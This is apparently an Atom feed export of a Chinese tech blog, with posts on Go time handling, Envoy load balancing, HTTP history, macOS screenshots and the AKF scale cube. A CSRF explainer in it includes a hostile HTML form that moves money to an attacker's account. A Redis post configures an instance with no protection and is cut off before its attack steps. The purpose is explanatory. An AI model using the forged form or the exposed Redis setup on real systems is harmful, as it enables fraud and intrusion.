<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">now := time.Now()</div><div class="line">&lt;-now.After(time.Second*<span class="number">10</span>):</div><div class="line"><span class="comment">// do sth</span></div></pre></td></tr></table></figure>
<p>假如得到now的时间以后，机器与外部时间进行了一步同步，把本机实际时间调慢1分钟，那么程序将会在第二行卡上70秒。<br>这会导致本地日志队列可能会爆仓。</p>
<p>与Duration相关的时间操作，譬如time.Since(start), time.Until(deadline), and time.Now().Before(deadline)等，对于时间重置非常敏感，所以它们需要参考 Monotonic 时间。</p>
<p>而如果时间是为了打印，或者start time/deadline time是外界传入的，那么 monotonic 时间将会是一个干扰。 此时应该使用  t = t.Round(0) 排除 monotonic。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;go 1.9 之后，给Time增加了 Monotonic 部分。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Envoy中的 LB 算法</title>
    <link href="http://zablog.me/2018/10/29/LB/"/>
    <id>http://zablog.me/2018/10/29/LB/</id>
    <published>2018-10-29T13:00:00.000Z</published>
    <updated>2018-10-30T02:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>LB是现代高并发应用必然的需求，下面介绍一下Envoy中使用的LB算法。</p>
<a id="more"></a>
<p>from <a href="https://github.com/envoyproxy/envoy/blob/stable/v1.7.1/api/envoy/api/v2/cds.proto#L119" target="_blank" rel="noopener">https://github.com/envoyproxy/envoy/blob/stable/v1.7.1/api/envoy/api/v2/cds.proto#L119</a></p>
<figure class="highlight pb"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">enum LbPolicy &#123;</div><div class="line">    ROUND_ROBIN = 0<span class="comment">;</span></div><div class="line">    LEAST_REQUEST = 1<span class="comment">;</span></div><div class="line">    RING_HASH = 2<span class="comment">;</span></div><div class="line">    RANDOM = 3<span class="comment">;</span></div><div class="line">    ORIGINAL_DST_LB = 4<span class="comment">;</span></div><div class="line">    MAGLEV = 5<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ROUND-ROBIN"><a href="#ROUND-ROBIN" class="headerlink" title="ROUND_ROBIN"></a>ROUND_ROBIN</h2><p>ROUND_ROBIN是使用最为广泛的LB算法，轮询。<br>举个例子：<br>1，2，3，4，5，6，六个请求依次访问有两个后端的LB，那么依ROUND_ROBIN算法，<br>服务器A服务1，3，5<br>服务器B服务2，4，6</p>
<p>Envoy的ROUND_ROBIN实际上是加权的。<br>由于服务后端的处理能力不同。假如服务器A能力比较强，我们分配了Weight=2；B的服务能力一般，我们分配了Weight=1，那么依照Weighted Round-Robin<br>服务器A服务1，2，4，5<br>服务器B服务3，6</p>
<h2 id="LEAST-REQUEST"><a href="#LEAST-REQUEST" class="headerlink" title="LEAST_REQUEST"></a>LEAST_REQUEST</h2><p>LEAST_REQUEST的意思是把请求送给当前活跃请求最少的服务器。<br>因为不同的请求需要耗费的资源实际上也是不一样的，我们假设2，4，6请求都特别耗费资源，1，3，5请求都很简单，那么把2，4，6都分配给服务器B就不甚合理。<br>1，2两个请求来了<br>服务器A服务1<br>服务器B服务2<br>1很快结束了，2还卡单<br>请求3来了，由于B现在有1个active req，A没有，所以分配给A<br>请求3也很快处理完<br>请求4来了，由于B现在有1个active req，A没有，所以分配给A<br>两个都在卡单。<br>请求5和6来了，分别分配给A，B。<br>最终，所有请求解决。</p>
<p>综上<br>服务器A服务1，3，4，5<br>服务器B服务2，6</p>
<h2 id="RING-HASH"><a href="#RING-HASH" class="headerlink" title="RING_HASH"></a>RING_HASH</h2><p>环形哈希是最基本的一致性哈希算法<br>需要设置hash key</p>
<p>来了一个新的请求，需要得到下游的时候，需要对Lookup Table进行二分查找。<br>当Lookup Table的大小为N的时候，需要Log(N)的查找时间复杂度。<br>N太大，每次查找时间太长；<br>N太小，环形哈希的均匀性又不够。<br>这个地方需要Trade-off，或者可以选用Maglev算法。</p>
<h2 id="RANDOM"><a href="#RANDOM" class="headerlink" title="RANDOM"></a>RANDOM</h2><p>纯随机<br>一般效果还不错。</p>
<h2 id="ORIGINAL-DST-LB"><a href="#ORIGINAL-DST-LB" class="headerlink" title="ORIGINAL_DST_LB"></a>ORIGINAL_DST_LB</h2><p>原始目的地负载均衡</p>
<p>upstream的主机基于downstream的连接元数据。这个是envoy特定的，不详细讲了。</p>
<h2 id="MAGLEV"><a href="#MAGLEV" class="headerlink" title="MAGLEV"></a>MAGLEV</h2><p>一种特殊的一致性哈希算法，效率比环形哈希要高一些，增删节点的影响一般更小。<br>需要设置hash key</p>
<p>首先对每一个后端节点产生一个permutation；<br>然后用一种特殊的walk算法，得到一个Lookup Table。<br>新的请求到来的时候，只需要直接查表即可，时间复杂度为O(1)。<br>walk算法保证哈希的概率是基本均匀的。</p>
<h1 id="Extra-healthy-panic-threshold"><a href="#Extra-healthy-panic-threshold" class="headerlink" title="Extra: healthy_panic_threshold"></a>Extra: healthy_panic_threshold</h1><p>Envoy中有一个监控恐慌阈值的设置，这个设置很有意思，所以在这里额外讲一下。</p>
<p>负载均衡一般是根据集群中主机的健康情况灵活变动的。当某台主机跪了，LB算法将会把它从候选列表中踢出去，这也是很合理的。</p>
<p>但是我们假设这么一种情况，某一时间，所有服务主机的负载情况是最大负载的80%，（负载800；最大处理能力1000）<br>因为某种原因，导致20.0%的机器彻底崩溃。（负载800；最大处理能力800）<br>LB策略忽略20%的机器，导致剩下的80%的机器都在最大处理负载上运行；<br>又来了一个网络波动，造成所有的服务器一个接一个崩溃，整个集群雪崩。<br>每拉起一台新的机器，LB策略立刻把所有的流量打到这么一台机器上，导致它再次崩溃。</p>
<p>如果有一个恐慌阈值，譬如50%，那么LB会在50%机器崩溃的时候，禁用淘汰策略，把所有机器都当做健康的，在整体集群上执行普通的Round-Robin策略。<br>多数机器恢复，整个集群的处理能力恢复80%的正确率。这使得整个集群能够在遇到极特殊情况的时候能够从困境中恢复。</p>
<p># </p>
<p>通用运营后台</p>
<p>火山和抖音都有搜索彩蛋的需求 就是搜索某个特定词的时候 出一些彩蛋，配合广告售卖或者活动<br>大家接到需求的想法就是 写个运营后台，数据存入mysql，然后再起个脚本，定时把数据按照格式dump到redis，在线服务读redis判断<br>或者说 单独抽象一个服务，运营后台负责写入，在线业务负责读取</p>
<p>搜索结果过滤条件</p>
<p>客户端配置，广告、图片链接配置，客户端Toast提示文本内容。<br>你可以设置用户满足什么地域、UID在哪个灰度的情况下，更换某一项内容。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LB是现代高并发应用必然的需求，下面介绍一下Envoy中使用的LB算法。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 简史复习</title>
    <link href="http://zablog.me/2018/10/04/http-brief-history/"/>
    <id>http://zablog.me/2018/10/04/http-brief-history/</id>
    <published>2018-10-04T13:00:00.000Z</published>
    <updated>2018-10-29T12:47:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>简要复习一下HTTP的发展历史。</p>
<a id="more"></a>
<h2 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h2><p>初代不成熟协议，只支持<code>GET</code>命令，仅接受HTML格式的子串，一次请求结束之后TCP连接随即关闭。</p>
<h2 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h2><p>不仅支持HTML，还支持图片、视频、二进制文件等。<br>增加了 POST HEAD，<br>每次Req和Resp都必须含有头部。整个头部只能使用ASCII编码<br>新增了状态码、权限、缓存、内容编码(content encoding)等功能。<br>新增Content-Type字段。</p>
<p>缺点：<br>但是每次只能发送一个请求，三次握手比较慢，另外需要慢启动。</p>
<p>连接复用采用 <code>Connection: keep-alive</code> 字段，该字段非标准。</p>
<h2 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h2><p>RFC 2616<br>第一个有正式标准的版本。</p>
<p>举个 🌰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">$&gt; telnet website.org 80</div><div class="line">Connected to xxx.xxx.xxx.xxx</div><div class="line"></div><div class="line">GET /index.html HTTP/1.1 ①</div><div class="line">Host: website.org</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)... (snip)</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip,deflate,sdch</div><div class="line">Accept-Language: en-US,en;q=0.8</div><div class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</div><div class="line">Cookie: __qca=P0-800083390... (snip)</div><div class="line"></div><div class="line">HTTP/1.1 200 OK ②</div><div class="line">Server: nginx/1.0.11</div><div class="line">Connection: keep-alive</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Via: HTTP/1.1 GWA</div><div class="line">Date: Wed, 25 Jul 2012 20:23:35 GMT</div><div class="line">Expires: Wed, 25 Jul 2012 20:23:35 GMT</div><div class="line">Cache-Control: max-age=0, no-cache</div><div class="line">Transfer-Encoding: chunked</div><div class="line"></div><div class="line">100  ③</div><div class="line">&lt;!doctype html&gt;</div><div class="line">(snip)</div><div class="line"></div><div class="line">100</div><div class="line">(snip)</div><div class="line"></div><div class="line">0 ④</div><div class="line"></div><div class="line">GET /favicon.ico HTTP/1.1 ⑤</div><div class="line">Host: www.website.org</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)... (snip)</div><div class="line">Accept: */*</div><div class="line">Referer: http://website.org/</div><div class="line">Connection: close ⑥</div><div class="line">Accept-Encoding: gzip,deflate,sdch</div><div class="line">Accept-Language: en-US,en;q=0.8</div><div class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</div><div class="line">Cookie: __qca=P0-800083390... (snip)</div><div class="line"></div><div class="line">HTTP/1.1 200 OK ⑦</div><div class="line">Server: nginx/1.0.11</div><div class="line">Content-Type: image/x-icon</div><div class="line">Content-Length: 3638</div><div class="line">Connection: close</div><div class="line">Last-Modified: Thu, 19 Jul 2012 17:51:44 GMT</div><div class="line">Cache-Control: max-age=315360000</div><div class="line">Accept-Ranges: bytes</div><div class="line">Via: HTTP/1.1 GWA</div><div class="line">Date: Sat, 21 Jul 2012 21:35:22 GMT</div><div class="line">Expires: Thu, 31 Dec 2037 23:55:55 GMT</div><div class="line">Etag: W/PSA-GAu26oXbDi</div><div class="line"></div><div class="line">(icon data)</div><div class="line">(connection closed)</div></pre></td></tr></table></figure>
<p>①：附带了encoding，charset和cookie元信息请求HTML文件<br>②：分块传输结果<br>③：分块的大小，以ASCII 十六进制表示。 100代表256字节。<br>④：用0，代表整个Response分块结束。<br>⑤：使用同一条TCP连接请求图标文件<br>⑥：提醒服务器，这个连接将不再被复用，可以关闭连接。<br>⑦：返回图标文件的信息，并在结尾处关闭连接。</p>
<p>以上样例重点贯彻了<code>HTTP/1.1</code>的连接复用、分块以及显式关闭等特征。</p>
<p>特征：</p>
<ol>
<li>默认TCP连接不关闭，可以被多个请求复用。不像HTTP/1.0还必须明确指明 Connection: Keep-Alive。</li>
<li>管道机制：同一个TCP连接，客户端可以发送多个请求。为了切分每个请求，必须在头部注明Content-Length</li>
<li>分块传输 chunk。</li>
</ol>
<p>其他功能</p>
<p>增加了 content, encoding, character set 等字段。<br>Host 字段<br>PUT PATCH HEAD OPTIONS DELETE</p>
<p>缺点</p>
<p>队头堵塞 Head-of-line blocking</p>
<h2 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h2><p>谷歌自研 2009年 ，HTTP/2的基础</p>
<h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h2><p>注意，不叫<code>HTTP/2.0</code>，下一个版本将是<code>HTTP/3</code>。</p>
<p>二进制协议</p>
<p>HTTP/1.1 的header肯定是ASCII，数据体可以是文本或二进制。<br>HTTP/2 是一个彻底的二进制协议，header和body都是二进制，并且统称为<code>帧</code>：头信息帧和数据帧。</p>
<p>多工 Multiplexing</p>
<p>HTTP/2 复用了TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而不是按照顺序。这避免了<code>队头堵塞</code>。</p>
<p>数据流</p>
<p>因为HTTP/2的数据包不按顺序发送，所以要指出每个数据包属于哪个回应。</p>
<p>每个请求或回应的所有数据包，称为一个数据流。每个数据流有个独一无二的ID。<br>客户端来的数据包的ID是奇数，服务端发送的数据包ID是偶数。</p>
<p>头信息压缩</p>
<p>一方面头可以压缩；另一方面，客户端和服务端维护了一张索引表，不用发送相同的字段。</p>
<p>服务器推送</p>
<p>未经过客户端的主动请求，服务器可以主动向客户端发送资源。</p>
<hr>
<p>参考：</p>
<p><a href="http://www.ruanyifeng.com/blog/2016/08/http.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/08/http.html</a><br><a href="https://github.com/abbshr/rfc7540-translation-zh_cn" target="_blank" rel="noopener">https://github.com/abbshr/rfc7540-translation-zh_cn</a><br><a href="https://tools.ietf.org/html/rfc7540" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7540</a> / <a href="https://httpwg.org/specs/rfc7540.html" target="_blank" rel="noopener">https://httpwg.org/specs/rfc7540.html</a><br><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn</a><br><a href="https://hpbn.co/brief-history-of-http/" target="_blank" rel="noopener">https://hpbn.co/brief-history-of-http/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简要复习一下HTTP的发展历史。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Mac OS X屏幕快照完全指南</title>
    <link href="http://zablog.me/2018/09/16/snapshot/"/>
    <id>http://zablog.me/2018/09/16/snapshot/</id>
    <published>2018-09-16T13:00:00.000Z</published>
    <updated>2018-09-16T13:07:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mac OS X提供了丰富的内嵌屏幕快照（截图）工具，但是默认的格式、截图位置等并不一定可以契合每一个用户的需求。好在我们使用命令行（Terminal.app 或者iTerm2等别的命令行工具）可以方便地定制屏幕快照。</p>
<a id="more"></a>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>在我们具体地讨论屏幕快照之前，我们先讲一下基本使用（经验丰富的用户可以跳过这个部分）</p>
<p>在Mac OS X中，有三种方式来截图：截取整个屏幕、截取选定的窗口、截取指定方形区域，以上每一个都可以用快捷键唤起。</p>
<p>Command + Shift + 3: 截取整个屏幕。如果你有多个屏幕，那么每个屏幕会分别被截在不同的图中。</p>
<p>Command + Shift + 4: 截取一个方形区域。接下来你可以用你的鼠标划取这个区域。</p>
<p><img src="https://cdn1.tekrevue.com/wp-content/uploads/2013/05/20130530_screenshotcrosshairs-615x386.jpg" alt=""></p>
<p>Command + Shift + 4, 然后按下空格: 截取一个窗口区域。</p>
<p>使用上述快捷键，默认会把截图保存到桌面上。</p>
<p>如果你在按上述快捷键的时候，同时按住Control键，那么截到的图片会暂时存在剪贴板中。</p>
<p>除了上述三个功能之外，/应用程序/实用工具/抓图.app还提供定时截图的功能。它可以有一个10秒钟的等待时间，会在你点击<code>启动定时器</code>按钮之后的10秒钟完成截图。</p>
<h1 id="使用终端命令行"><a href="#使用终端命令行" class="headerlink" title="使用终端命令行"></a>使用终端命令行</h1><p>后续每个效果，都得通过执行这句指令才能生效。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">killall SystemUIServer</div></pre></td></tr></table></figure>
<p>这句话起到了刷新作用。</p>
<h1 id="改变格式"><a href="#改变格式" class="headerlink" title="改变格式"></a>改变格式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture type [format]</div></pre></td></tr></table></figure>
<p><code>[format]</code> 可以输入为</p>
<ul>
<li>bmp</li>
<li>pdf</li>
<li>jpg</li>
<li>jp2</li>
<li>tif</li>
<li>pict</li>
<li>tga</li>
<li>png</li>
</ul>
<p>譬如，你可以通过输入<code>defaults write com.apple.screencapture type jpg</code>把默认图片格式改为jpg</p>
<h1 id="改变文件名"><a href="#改变文件名" class="headerlink" title="改变文件名"></a>改变文件名</h1><p>系统默认存储的文件名为<code>屏幕快照 [date] [time].[format]</code>，譬如<code>屏幕快照 2018-07-31 下午4.01.16.png</code>。<br>你无法把时间戳从文件名中移除，但是你可以改掉<code>屏幕快照</code>这个前缀。方法是输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture name [file name]</div></pre></td></tr></table></figure>
<h1 id="修改默认保存位置"><a href="#修改默认保存位置" class="headerlink" title="修改默认保存位置"></a>修改默认保存位置</h1><p>默认是保存到桌面的。你可以手动改变保存位置。</p>
<p>命令是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture location</div></pre></td></tr></table></figure></p>
<p>首先，你必须要创建一个新的文件夹，当然你要了解你文件夹的位置。<br>譬如你创建了一个名字叫做<code>abc</code>的文件夹在桌面上，那么这个文件夹的位置就是~/Desktop/abc</p>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture location /Users/[username]/Desktop/abc/</div></pre></td></tr></table></figure>
<h1 id="窗口阴影"><a href="#窗口阴影" class="headerlink" title="窗口阴影"></a>窗口阴影</h1><p>截图的时候默认是有窗口阴影的，你可以用命令改掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">defaults write com.apple.screencapture disable-shadow -bool true</div></pre></td></tr></table></figure>
<p>效果图：<br><img src="https://cdn1.tekrevue.com/wp-content/uploads/2013/03/20130301_osxscreenshots_4.jpg" alt=""></p>
<hr>
<p>参考：<br><a href="https://www.tekrevue.com/tip/how-to-customize-screenshot-options-in-mac-os-x/" target="_blank" rel="noopener">The Complete Guide to Mac OS X Screenshots</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac OS X提供了丰富的内嵌屏幕快照（截图）工具，但是默认的格式、截图位置等并不一定可以契合每一个用户的需求。好在我们使用命令行（Terminal.app 或者iTerm2等别的命令行工具）可以方便地定制屏幕快照。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
      <category term="OS X" scheme="http://zablog.me/tags/OS-X/"/>
    
  </entry>
  
  <entry>
    <title>AKF扩展立方</title>
    <link href="http://zablog.me/2018/09/10/scale-cube/"/>
    <id>http://zablog.me/2018/09/10/scale-cube/</id>
    <published>2018-09-10T13:00:00.000Z</published>
    <updated>2018-09-10T12:57:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>《THE ART OF SCALABILITY》中描述了一个非常有用的扩展模型：扩展立方（也叫AKF扩展立方）。<br>这个模型把应用比作立方体，为了支持应用的发展和演进，我们可以通过x，y，z三个方向对它进行扩展。</p>
<a id="more"></a>
<p><img src="https://akfpartners.com//uploads/blog/AKF_Scale_Cube.gif" alt=""></p>
<h2 id="X轴扩展"><a href="#X轴扩展" class="headerlink" title="X轴扩展"></a>X轴扩展</h2><p>在负载均衡之后运行应用的多个拷贝。这是最简单最常用的扩展方式。</p>
<p>缺陷：</p>
<ul>
<li>每个拷贝需要访问所有的数据，对缓存机制要求很高，数据库很可能成为瓶颈。</li>
<li>不会减少日益增长的开发复杂度。</li>
</ul>
<h2 id="Y轴扩展"><a href="#Y轴扩展" class="headerlink" title="Y轴扩展"></a>Y轴扩展</h2><p>把整个应用切分为不同的服务，每个服务负责一个或少量几个关系相近的函数。</p>
<p>有好几种解耦拆分方式。一种是按照动词分割，一种是按照名词分割。</p>
<p>以购物网站为例：按照动词分割就是按照操作分割，服务1只负责购买流程，服务2只负责售后流程，服务3只负责广告投放流程；<br>按照名词分割就是按照对象类型分割，服务1只负责商品信息；服务2只负责用户信息。</p>
<p>两种扩展经常是同时使用的！</p>
<p>微服务化就是Y轴扩展的一个重要方式。</p>
<h2 id="Z轴扩展"><a href="#Z轴扩展" class="headerlink" title="Z轴扩展"></a>Z轴扩展</h2><p>Z轴扩展和X轴扩展很像，但是在Z轴扩展中，每个服务只跑特定的一部分代码或数据集。</p>
<p>Z轴扩展一般用来扩展数据库。（数据库分片）<br>在做某些查询的时候，查询指令被送给每一个分片，然后分别查询，最终获得的结果聚合之后返回。<br>做写入的时候，只需要按照分片键，找到对应的实例进行写入即可。</p>
<p>Z轴扩展的优势：</p>
<ul>
<li>每个服务器只处理一部分数据</li>
<li>优化了缓存的利用率，减少内存使用和I/O</li>
<li>增强了事务的扩展性</li>
<li>故障隔离</li>
</ul>
<p>劣势：</p>
<ul>
<li>增加了整体的复杂度。</li>
<li>需要实现分片机制。万一有重新分片的需求的话，令人头大。</li>
<li>增加复杂度的同事，并没有降低开发的复杂度，这个需要Y轴扩展配合解决。</li>
</ul>
<hr>
<p>参考：<br><a href="https://microservices.io/articles/scalecube.html" target="_blank" rel="noopener">The Scale Cube | Microservice Architecture</a></p>
<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JSON Web Tokens</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造Cross-site request forgery（简称CSRF, 读作 [sea-surf]）是一种典型的利用cookie-session漏洞的攻击，这里借用spring-security的一个例子来解释CSRF：</p>
<p>假设你经常使用bank.example.com进行网上转账，在你提交转账请求时bank.example.com的前端代码会提交一个HTTP请求:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/transfer</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: bank.example.com</div><div class="line"><span class="attribute">cookie</span>: JsessionID=randomid; Domain=bank.example.com; Secure; HttpOnly</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">amount=100.00&amp;routingNumber=1234&amp;account=9876</div></pre></td></tr></table></figure>
<p>你图方便没有登出bank.example.com，随后又访问了一个恶意网站，该网站的HTML页面包含了这样一个表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://bank.example.com/transfer"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"amount"</span> <span class="attr">value</span>=<span class="string">"100.00"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"routingNumber"</span> <span class="attr">value</span>=<span class="string">"evilsRoutingNumber"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"account"</span> <span class="attr">value</span>=<span class="string">"evilsAccountNumber"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击就送!"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
<p>你被“点击就送”吸引了，当你点了提交按钮时你已经向攻击者的账号转了100元。现实中的攻击可能更隐蔽，恶意网站的页面可能使用Javascript自动完成提交。尽管恶意网站没有办法盗取你的session cookie（从而假冒你的身份），但恶意网站向bank.example.com发起请求时，你的cookie会被自动发送过去。</p>
<p>因此，有些人认为前端代码将JWT通过HTTP header发送给服务端（而不是通过cookie自动发送）可以有效防护CSRF。在这种方案中，服务端代码在完成认证后，会在HTTP response的header中返回JWT，前端代码将该JWT存放到Local Storage里待用，或是服务端直接在cookie中保存HttpOnly=false的JWT。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《THE ART OF SCALABILITY》中描述了一个非常有用的扩展模型：扩展立方（也叫AKF扩展立方）。&lt;br&gt;这个模型把应用比作立方体，为了支持应用的发展和演进，我们可以通过x，y，z三个方向对它进行扩展。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Redis漏洞攻击</title>
    <link href="http://zablog.me/2018/04/06/redis-hole/"/>
    <id>http://zablog.me/2018/04/06/redis-hole/</id>
    <published>2018-04-06T07:34:46.000Z</published>
    <updated>2018-04-06T08:04:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。<br><a id="more"></a><br>在阿里云上分别申请两台服务器，分别是<br>肉鸡： <code>172.17.171.122</code><br>攻击者：<code>172.17.171.123</code></p>
<h2 id="配置无防护的肉鸡"><a href="#配置无防护的肉鸡" class="headerlink" title="配置无防护的肉鸡"></a>配置无防护的肉鸡</h2><p>登陆<code>172.17.171.122</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@Target:~# wget http://download.redis.io/releases/redis-4.0.9.tar.gz</div><div class="line">root@Target:~# tar xzf redis-4.0.9.tar.gz</div><div class="line">root@Target:~# cd redis-4.0.9</div><div class="line">root@Target:~# make</div><div class="line">root@Target:~# vim redis.conf</div></pre></td></tr></table></figure>
<p>编辑redis.conf，把 bind 127.0.0.1 注释掉，以开放端口到外部端口， 并把<code>protected-mode yes</code>改为<code>protected-mode no</code>，使得外界不用密码也能够访问到此redis实例。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src/redis-server redis.conf</div></pre></td></tr></table></figure>
<h2 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h2><p>登陆<code>172.17.171.123</code></p>
